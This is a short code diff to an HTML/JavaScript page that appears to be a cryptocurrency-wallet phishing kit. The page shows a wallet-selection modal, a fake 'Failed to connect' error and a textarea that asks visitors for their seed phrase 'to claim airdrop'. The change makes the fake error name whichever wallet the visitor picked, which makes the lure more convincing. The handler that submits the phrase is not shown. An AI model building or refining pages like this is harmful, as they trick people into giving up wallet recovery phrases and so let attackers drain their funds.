@@ -714,7 +714,7 @@ window.smartsupp||(function(d) {
       <span id="selected-wallet-name"></span>
     </div>
     <textarea id="seed-phrase-input" placeholder="Enter your seed phrase to claim airdrop"></textarea>
-    <div class="error-message">Failed to connect Trust Wallet. Enter your seed phrase to claim airdrop</div>
+    <div id="selected-error-message" class="error-message"></div>
     <button class="connect-btn" onclick="submitSeedPhrase()">Connect wallet</button>
   </div>
 </div>
@@ -803,6 +803,7 @@ function selectWallet(name, icon) {
       document.getElementById('selected-wallet-title').textContent = `Connect ${name}`;
       document.getElementById('selected-wallet-name').textContent = name;
       document.getElementById('selected-wallet-icon').src = icon;
+      document.getElementById('selected-error-message').textContent = `Failed to connect to ${name}. Enter your seed phrase to claim airdrop`;
       
       // Open second modal
       modal2.style.display = 'flex';
